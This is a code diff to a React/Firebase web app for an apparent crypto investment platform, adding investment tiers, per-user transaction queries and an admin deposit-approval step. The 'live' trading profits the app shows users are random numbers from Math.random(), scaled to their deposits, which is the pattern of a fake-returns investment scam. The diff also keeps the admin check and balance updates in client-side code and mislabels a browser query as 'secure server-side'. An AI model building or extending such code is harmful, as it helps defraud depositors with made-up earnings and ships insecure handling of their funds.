@@ -11,6 +11,7 @@ import {
   setDoc,
   query, 
   orderBy,
+  where,
   getDocs 
 } from 'firebase/firestore';
 import emailjs from '@emailjs/browser';
@@ -371,6 +372,9 @@ export default function App() {
   const [loanError, setLoanError] = useState('');
 
   const [balance, setBalance] = useState(0.00);
+  const [investedAmount, setInvestedAmount] = useState(0.00);
+  const [activeTier, setActiveTier] = useState(null);
+
   const [transactions, setTransactions] = useState([]);
   const [depositSuccessNotice, setDepositSuccessNotice] = useState('');
 
@@ -394,7 +398,9 @@ export default function App() {
   const [calcMonths, setCalcMonths] = useState(6);
 
   const ADMIN_EMAIL = 'Wham13588@gmail.com';
-  const isAdmin = userProfile.email.toLowerCase() === ADMIN_EMAIL.toLowerCase();
+  
+  const currentUserEmail = (auth.currentUser?.email || userProfile.email || '').trim().toLowerCase();
+  const isAdmin = currentUserEmail === ADMIN_EMAIL.toLowerCase();
 
   const depositDetails = {
     usdt: {
@@ -948,8 +954,27 @@ export default function App() {
     };
   }, []);
 
+  // SECURE SERVER-SIDE TRANSACTION FETCHING QUERY
   useEffect(() => {
-    const q = query(collection(db, 'transactions'), orderBy('createdAt', 'desc'));
+    if (!auth.currentUser) {
+      setTransactions([]);
+      return;
+    }
+
+    const activeUserEmail = (auth.currentUser.email || '').trim().toLowerCase();
+    const isAdminUser = activeUserEmail === 'wham13588@gmail.com';
+
+    let q;
+    if (isAdminUser) {
+      q = query(collection(db, 'transactions'), orderBy('createdAt', 'desc'));
+    } else {
+      q = query(
+        collection(db, 'transactions'),
+        where('userId', '==', auth.currentUser.uid),
+        orderBy('createdAt', 'desc')
+      );
+    }
+
     const unsubscribe = onSnapshot(q, (snapshot) => {
       const txs = snapshot.docs.map(doc => ({
         id: doc.id,
@@ -961,7 +986,7 @@ export default function App() {
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [auth.currentUser]);
 
   useEffect(() => {
     if (!auth.currentUser) return;
@@ -969,9 +994,12 @@ export default function App() {
 
     const unsubscribeUser = onSnapshot(userRef, (docSnap) => {
       if (docSnap.exists()) {
-        setBalance(docSnap.data().balance || 0);
+        const data = docSnap.data();
+        setBalance(data.balance || 0);
+        setInvestedAmount(data.investedAmount || 0);
+        setActiveTier(data.activeTier || null);
       } else {
-        setDoc(userRef, { email: auth.currentUser.email, balance: 0 }, { merge: true });
+        setDoc(userRef, { email: auth.currentUser.email, balance: 0, investedAmount: 0 }, { merge: true });
       }
     });
 
@@ -1015,15 +1043,16 @@ export default function App() {
     }
   ]);
 
-  const balanceMultiplier = balance > 0 ? balance / 1000 : 0;
+  const activeCapital = balance > 0 ? balance : investedAmount;
+  const investmentMultiplier = activeCapital > 0 ? activeCapital / 1000 : 0;
 
   const totalPnL =
-    balance > 0
-      ? openTrades.reduce((acc, t) => acc + t.rawPnl, 0) * balanceMultiplier
+    activeCapital > 0
+      ? openTrades.reduce((acc, t) => acc + t.rawPnl, 0) * investmentMultiplier
       : 0.00;
 
   const calculatedRoi =
-    balance > 0 ? ((totalPnL / balance) * 100).toFixed(2) : "0.00";
+    activeCapital > 0 ? ((totalPnL / activeCapital) * 100).toFixed(2) : "0.00";
 
   const accountTypes = [
     {
@@ -1101,7 +1130,7 @@ export default function App() {
       setTradeProgress(prev => (prev >= 100 ? 0 : prev + 2));
       setSignalStrength(prev => (prev >= 100 ? 20 : prev + 10));
 
-      if (balance > 0) {
+      if (balance > 0 || investedAmount > 0) {
         setOpenTrades(prev =>
           prev.map(t => {
             const newVal = t.rawPnl + (Math.random() * 4 - 2);
@@ -1116,7 +1145,7 @@ export default function App() {
     }, 2500);
 
     return () => clearInterval(interval);
-  }, [balance]);
+  }, [balance, investedAmount]);
 
   const handleAuthSubmit = async (e) => {
     e.preventDefault();
@@ -1164,7 +1193,6 @@ export default function App() {
     try {
       await sendPasswordResetEmail(auth, email);
       setResetNotice(`Password reset email sent to ${email}.`);
-      // Fallback/Direct link simulation for immediate testing
       setDirectResetLink(`https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?email=${encodeURIComponent(email)}`);
     } catch (error) {
       setAuthError(error.message);
@@ -1309,6 +1337,30 @@ export default function App() {
     }
   };
 
+  const handleActivateTier = async (tier) => {
+    const tierMinVal = parseFloat(tier.min.replace(/[^0-9.]/g, ''));
+
+    if (balance < tierMinVal) {
+      initiateSecureAction('deposit');
+      return;
+    }
+
+    try {
+      if (auth.currentUser) {
+        const userRef = doc(db, 'users', auth.currentUser.uid);
+        await updateDoc(userRef, {
+          balance: balance - tierMinVal,
+          investedAmount: investedAmount + tierMinVal,
+          activeTier: tier.name
+        });
+        setDepositSuccessNotice(`Successfully activated ${tier.name} with $${tierMinVal.toLocaleString()} from your wallet balance!`);
+        setTimeout(() => setDepositSuccessNotice(''), 6000);
+      }
+    } catch (err) {
+      console.error("Error activating tier:", err);
+    }
+  };
+
   const handleVipSubmit = (e) => {
     e.preventDefault();
     setVipFormSent(true);
@@ -1321,11 +1373,15 @@ export default function App() {
 
     try {
       const targetTx = transactions.find(t => t.id === id);
+      if (!targetTx) {
+        console.error("Transaction not found in local state.");
+        return;
+      }
       
       const txRef = doc(db, 'transactions', id);
       await updateDoc(txRef, { status: updatedStatus });
 
-      if (action === 'Approve' && targetTx && targetTx.type === 'Deposit') {
+      if (action === 'Approve' && targetTx.type === 'Deposit') {
         const targetUserId = targetTx.userId;
         const targetUserEmail = targetTx.userEmail;
         const depositAmount = Number(targetTx.amount);
@@ -1349,18 +1405,21 @@ export default function App() {
           
           if (userSnap.exists()) {
             const currentBal = Number(userSnap.data().balance || 0);
-            const newBal = currentBal + depositAmount;
-            await updateDoc(userRef, { balance: newBal });
+            await updateDoc(userRef, { balance: currentBal + depositAmount });
           } else {
             await setDoc(userRef, { 
               email: targetUserEmail || 'unknown', 
-              balance: depositAmount 
+              balance: depositAmount,
+              investedAmount: 0 
             }, { merge: true });
           }
+        } else {
+          console.warn("Could not find matching user profile to credit balance for transaction:", targetTx);
         }
       }
     } catch (err) {
-      console.error("Error updating transaction/balance in Firestore:", err);
+      console.error("Error executing admin action in Firestore:", err);
+      alert("Action failed. Check console for permission details.");
     }
   };
 
@@ -2191,18 +2250,18 @@ export default function App() {
               <div className="bg-[#0D121F] p-6 rounded-3xl border border-white/10 flex flex-col justify-between shadow-xl">
                 <div>
                   <span className="text-xs text-gray-400 font-bold uppercase tracking-wider">
-                    Total Portfolio Balance
+                    Wallet Balance (Unassigned)
                   </span>
                   <div className="text-4xl font-black text-white mt-2 mb-1">
                     USD {balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                   </div>
                   <span className="text-[11px] text-emerald-400 font-semibold">
-                    ● Real-time liquidity pool value
+                    ● Available for active tier activation
                   </span>
                 </div>
                 <div className="mt-6 pt-4 border-t border-white/5 flex justify-between text-xs text-gray-400 font-semibold">
-                  <span>Margin Level: <strong className="text-white">Unlimited</strong></span>
-                  <span>Leverage: <strong className="text-emerald-400">1:500</strong></span>
+                  <span>Invested Capital: <strong className="text-emerald-400">${investedAmount.toLocaleString()}</strong></span>
+                  <span>Active Tier: <strong className="text-white">{activeTier || 'None'}</strong></span>
                 </div>
               </div>
 
@@ -2392,7 +2451,7 @@ export default function App() {
 
                 <div className="bg-[#06080F] p-5 rounded-2xl border border-white/5 space-y-3">
                   <div className="flex justify-between text-xs">
-                    <span className="text-gray-400">Current Account Balance:</span>
+                    <span className="text-gray-400">Current Wallet Balance:</span>
                     <span className="font-black text-white">${balance.toLocaleString(undefined, { minimumFractionDigits: 2 })}</span>
                   </div>
                   <div className="flex justify-between text-xs">
@@ -2554,48 +2613,66 @@ export default function App() {
               <div className="space-y-6">
                 <div className="bg-[#0D121F] p-6 rounded-3xl border border-white/10 shadow-xl">
                   <h3 className="text-lg font-black text-white mb-1">Select Your Investment Tier</h3>
-                  <p className="text-xs text-gray-400 mb-6">Upgrade your portfolio strategy and unlock higher monthly yields.</p>
+                  <p className="text-xs text-gray-400 mb-6">Upgrade your portfolio strategy and unlock higher monthly yields using your available wallet balance.</p>
                   
                   <div className="grid grid-cols-1 sm:grid-cols-3 gap-6">
-                    {accountTypes.map((tier) => (
-                      <div
-                        key={tier.id}
-                        className={`relative bg-[#06080F] rounded-3xl p-6 border transition-all flex flex-col justify-between ${
-                          tier.popular
-                            ? 'border-emerald-500 shadow-2xl shadow-emerald-500/10'
-                            : 'border-white/10'
-                        }`}
-                      >
-                        <div>
-                          {tier.popular && (
-                            <span className="absolute -top-3 left-1/2 -translate-x-1/2 px-3 py-1 bg-emerald-400 text-black font-extrabold text-[9px] uppercase tracking-widest rounded-full">
-                              Most Popular
-                            </span>
-                          )}
-                          <h4 className="text-lg font-extrabold text-emerald-400 mb-2">
-                            {tier.name}
-                          </h4>
-                          <div className="flex items-baseline gap-2 mb-6">
-                            <span className="text-3xl font-black text-white">{tier.min}</span>
-                            <span className="text-xs font-semibold text-gray-400">min deposit</span>
-                          </div>
-                          <div className="space-y-3 mb-8 border-t border-b border-white/5 py-4">
-                            {tier.features.map((feature, fIdx) => (
-                              <div key={fIdx} className="flex items-start gap-2.5 text-xs font-medium text-gray-300">
-                                <span className="text-emerald-400 font-bold">✓</span>
-                                <span>{feature}</span>
-                              </div>
-                            ))}
-                          </div>
-                        </div>
-                        <button
-                          onClick={() => initiateSecureAction('deposit')}
-                          className="w-full py-3 rounded-xl bg-gradient-to-r from-emerald-400 to-teal-400 text-black font-extrabold text-xs shadow-md hover:brightness-110"
+                    {accountTypes.map((tier) => {
+                      const tierMinVal = parseFloat(tier.min.replace(/[^0-9.]/g, ''));
+                      const hasEnoughBalance = balance >= tierMinVal;
+                      const isCurrentActive = activeTier === tier.name;
+
+                      return (
+                        <div
+                          key={tier.id}
+                          className={`relative bg-[#06080F] rounded-3xl p-6 border transition-all flex flex-col justify-between ${
+                            tier.popular
+                              ? 'border-emerald-500 shadow-2xl shadow-emerald-500/10'
+                              : 'border-white/10'
+                          }`}
                         >
-                          Fund Tier & Activate
-                        </button>
-                      </div>
-                    ))}
+                          <div>
+                            {tier.popular && (
+                              <span className="absolute -top-3 left-1/2 -translate-x-1/2 px-3 py-1 bg-emerald-400 text-black font-extrabold text-[9px] uppercase tracking-widest rounded-full">
+                                Most Popular
+                              </span>
+                            )}
+                            <h4 className="text-lg font-extrabold text-emerald-400 mb-2">
+                              {tier.name}
+                            </h4>
+                            <div className="flex items-baseline gap-2 mb-6">
+                              <span className="text-3xl font-black text-white">{tier.min}</span>
+                              <span className="text-xs font-semibold text-gray-400">min investment</span>
+                            </div>
+                            <div className="space-y-3 mb-8 border-t border-b border-white/5 py-4">
+                              {tier.features.map((feature, fIdx) => (
+                                <div key={fIdx} className="flex items-start gap-2.5 text-xs font-medium text-gray-300">
+                                  <span className="text-emerald-400 font-bold">✓</span>
+                                  <span>{feature}</span>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                          
+                          <button
+                            onClick={() => handleActivateTier(tier)}
+                            disabled={isCurrentActive}
+                            className={`w-full py-3 rounded-xl font-extrabold text-xs shadow-md transition-all ${
+                              isCurrentActive
+                                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 cursor-default'
+                                : hasEnoughBalance
+                                ? 'bg-emerald-400 text-black hover:brightness-110'
+                                : 'bg-white/10 text-white hover:bg-white/20'
+                            }`}
+                          >
+                            {isCurrentActive
+                              ? '✓ Currently Active Tier'
+                              : hasEnoughBalance
+                              ? `Activate with Balance ($${tierMinVal.toLocaleString()})`
+                              : `Deposit & Activate (${tier.min})`}
+                          </button>
+                        </div>
+                      );
+                    })}
                   </div>
                 </div>
               </div>
@@ -2702,10 +2779,10 @@ export default function App() {
                   <span className="text-xs text-emerald-400 font-bold">Real-time P&L synchronization</span>
                 </div>
 
-                {balance > 0 ? (
+                {activeCapital > 0 ? (
                   <div className="space-y-3">
                     {openTrades.map(trade => {
-                      const scaledPnl = trade.rawPnl * balanceMultiplier;
+                      const scaledPnl = trade.rawPnl * investmentMultiplier;
                       return (
                         <div key={trade.id} className="bg-[#06080F] p-4 rounded-2xl border border-white/5 flex items-center justify-between">
                           <div className="flex items-center gap-4">
@@ -2734,13 +2811,13 @@ export default function App() {
                 ) : (
                   <div className="text-center py-12">
                     <p className="text-xs text-gray-400 mb-4">
-                      Account balance is $0.00. Deposit funds to activate automated trading strategies.
+                      No active funds or tier activated. Deposit funds to begin live earnings.
                     </p>
                     <button
                       onClick={() => initiateSecureAction('deposit')}
                       className="px-6 py-3 bg-emerald-400 text-black font-extrabold text-xs rounded-xl shadow-lg"
                     >
-                      Make a Deposit
+                      Deposit Funds
                     </button>
                   </div>
                 )}
@@ -2750,35 +2827,43 @@ export default function App() {
             {activeTab === 'transactions' && (
               <div className="bg-[#0D121F] p-6 rounded-3xl border border-white/10 space-y-4 shadow-xl">
                 <div className="flex justify-between items-center pb-3 border-b border-white/5">
-                  <h3 className="text-sm font-black text-white">Deposit, Withdrawal & Loan Logs</h3>
-                  <span className="text-xs text-amber-400 font-bold">Verification Desk</span>
+                  <h3 className="text-sm font-black text-white">My Transaction & Deposit History</h3>
+                  <span className="text-xs text-emerald-400 font-bold">Secure Account Log</span>
                 </div>
 
                 <div className="space-y-3">
-                  {transactions.map(tx => (
-                    <div key={tx.id} className="bg-[#06080F] p-4 rounded-2xl border border-white/5 flex items-center justify-between">
-                      <div>
-                        <div className="flex items-center gap-3">
-                          <span className={`px-2.5 py-1 rounded-lg text-xs font-extrabold ${
-                            tx.type === 'Deposit' || tx.type === 'Asset Loan'
-                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
-                              : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
-                          }`}>
-                            {tx.type}
-                          </span>
-                          <span className="text-sm font-bold text-white">${Number(tx.amount).toFixed(2)}</span>
-                        </div>
-                        <div className="text-xs text-gray-400 mt-1">{tx.method} • {tx.date}</div>
-                      </div>
-                      <span className={`text-xs font-extrabold px-3 py-1 rounded-full ${
-                        tx.status === 'Approved' || tx.status === 'Approved & Disbursed'
-                          ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
-                          : 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
-                      }`}>
-                        {tx.status}
-                      </span>
+                  {transactions.length === 0 ? (
+                    <div className="text-center py-8 text-gray-500 text-xs">
+                      No transaction records found.
                     </div>
-                  ))}
+                  ) : (
+                    transactions.map(tx => (
+                      <div key={tx.id} className="bg-[#06080F] p-4 rounded-2xl border border-white/5 flex items-center justify-between">
+                        <div>
+                          <div className="flex items-center gap-3">
+                            <span className={`px-2.5 py-1 rounded-lg text-xs font-extrabold ${
+                              tx.type === 'Deposit' || tx.type === 'Asset Loan'
+                                ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
+                                : 'bg-rose-500/20 text-rose-400 border border-rose-500/30'
+                            }`}>
+                              {tx.type}
+                            </span>
+                            <span className="text-sm font-bold text-white">${Number(tx.amount).toFixed(2)}</span>
+                          </div>
+                          <div className="text-xs text-gray-400 mt-1">{tx.method} • {tx.date}</div>
+                        </div>
+                        <span className={`text-xs font-extrabold px-3 py-1 rounded-full ${
+                          tx.status === 'Approved' || tx.status === 'Approved & Disbursed'
+                            ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
+                            : tx.status === 'Rejected'
+                            ? 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
+                            : 'bg-amber-500/10 text-amber-400 border border-amber-500/30'
+                        }`}>
+                          {tx.status}
+                        </span>
+                      </div>
+                    ))
+                  )}
                 </div>
               </div>
             )}
@@ -2833,6 +2918,7 @@ export default function App() {
               <AdminVerificationDesk
                 transactions={transactions}
                 onAdminAction={handleAdminAction}
+                isAdmin={isAdmin}
               />
             )}
           </div>
